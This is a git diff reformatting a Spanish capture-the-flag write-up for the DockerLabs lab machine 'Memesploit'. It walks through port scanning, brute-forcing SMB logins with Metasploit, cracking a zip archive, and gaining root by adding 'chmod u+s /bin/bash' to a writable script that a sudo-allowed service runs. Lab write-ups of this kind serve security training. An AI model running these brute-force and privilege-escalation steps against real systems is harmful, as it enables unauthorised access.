@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Memesploit 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Memesploit ​​
+
+## 🖥️ Writeup - Memesploit
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `SMB` `Metasploit` `Brute Force` `Zip Cracking` `Sudoers` `Service Abuse` `Writable File` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip memesploit.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh memesploit.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,445 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 19:54 CET
 Nmap scan report for 172.17.0.2
@@ -91,13 +100,13 @@ Identificamos los puertos abiertos: `22` (SSH), `80` (HTTP) y `445` (Samba).
 
 Al acceder al puerto `80`, encontramos la página web con el contenido:
 
-![alt text](../../images/darkweb.png)
+![alt text](../../.gitbook/assets/darkweb.png)
 
 Observamos que el texto presenta campos o palabras ocultas.
 
 Mediante la inspección del código fuente de la página, recuperamos las siguientes cadenas de texto ocultas: `fuerzabrutasiempre`, `metasploit_ctf` y `memehydra`.
 
-![alt text](../../images/darkweb2.png)
+![alt text](../../.gitbook/assets/darkweb2.png)
 
 Estas palabras clave sugieren la necesidad de un ataque de `fuerza bruta`, siendo probable que `memehydra` sea un usuario o una contraseña.
 
@@ -105,7 +114,7 @@ Creamos un archivo de `.txt` que contendrá estas tres palabras, el cual utiliza
 
 Inicialmente, intentamos el ataque de `fuerza bruta` contra el puerto `22` (SSH), pero no obtenemos ninguna credencial válida.
 
-# METASPLOIT
+## METASPLOIT
 
 A continuación, probamos contra el puerto `445` (Samba), esta vez utilizando `Metasploit`.
 
@@ -122,6 +131,7 @@ run
 ```
 
 Info:
+
 ```
 msf auxiliary(scanner/smb/smb_login) > run
 [*] 172.17.0.2:445        - 172.17.0.2:445 - Starting SMB login bruteforce
@@ -140,14 +150,14 @@ msf auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-Aunque el ataque genera tres `sesiones SMB` en `Metasploit`, solo la primera es la válida, con las credenciales `memehydra` : `fuerzabrutasiempre`.
-Procedemos a acceder a dicha sesión.
+Aunque el ataque genera tres `sesiones SMB` en `Metasploit`, solo la primera es la válida, con las credenciales `memehydra` : `fuerzabrutasiempre`. Procedemos a acceder a dicha sesión.
 
 ```bash
 sessions 1
 ```
 
 Info:
+
 ```
 msf auxiliary(scanner/smb/smb_login) > sessions 1
 [*] Starting interaction with 1...
@@ -162,6 +172,7 @@ shares
 ```
 
 Info:
+
 ```
 Shares
 ======
@@ -180,6 +191,7 @@ shares -i 1
 ```
 
 Info:
+
 ```
 SMB (172.17.0.2) > shares -i 1
 [+] Successfully connected to share_memehydra
@@ -192,6 +204,7 @@ download secret.zip
 ```
 
 Info:
+
 ```
 SMB (172.17.0.2\share_memehydra) > download secret.zip
 [*] Downloaded 224.00 B of 224.00 B (100.0%)
@@ -200,7 +213,7 @@ SMB (172.17.0.2\share_memehydra) > download secret.zip
 
 A continuación, intentamos descomprimir el archivo `.zip`.
 
-```bash 
+```bash
 unzip secreto.zip
 ```
 
@@ -217,7 +230,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 Info:
-``` 
+
+```
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 2 OpenMP threads
@@ -233,6 +247,7 @@ Por lo tanto, probamos a utilizar como contraseña las palabras clave que había
 La cadena `metasploit_ctf` resulta ser la contraseña correcta, y descomprimimos el archivo `secreto.zip` con éxito.
 
 Info:
+
 ```
 unzip secret.zip                                         
 Archive:  secret.zip
@@ -253,15 +268,16 @@ Obtenemos un nuevo conjunto de credenciales, con las cuales intentaremos autenti
 ssh memesploit@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for memesploit on 4bcd01ee6d93:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -272,26 +288,27 @@ User memesploit may run the following commands on 4bcd01ee6d93:
 
 Vemos que podemos ejecutar el binario `service` con privilegios de `root` para reiniciar un servicio denominado `login_monitor`.
 
-Procedemos a ejecutarlo para analizar su comportamiento. 
+Procedemos a ejecutarlo para analizar su comportamiento.
 
 ```bash
 sudo /usr/sbin/service login_monitor restart
 ```
 
 Info:
+
 ```
 Stopping login_monitor...
 Starting login_monitor...
 ```
 
-Confirmamos que la única acción que realiza es el reinicio del servicio.
-A continuación, buscamos la ubicación de los archivos de configuración de este servicio.
+Confirmamos que la única acción que realiza es el reinicio del servicio. A continuación, buscamos la ubicación de los archivos de configuración de este servicio.
 
 ```bash
 find / -name 'login_monitor' 2>/dev/null
 ```
 
 Info:
+
 ```
 /etc/init.d/login_monitor
 /etc/login_monitor
@@ -305,6 +322,7 @@ ls -la
 ```
 
 Info:
+
 ```
 total 36
 drwxrwx--- 2 root security 4096 Aug 31  2024 ./
@@ -328,6 +346,7 @@ nano actionban.sh
 ```
 
 Código:
+
 ```
 chmod u+s /bin/bash
 ```
@@ -345,6 +364,7 @@ bash -p
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
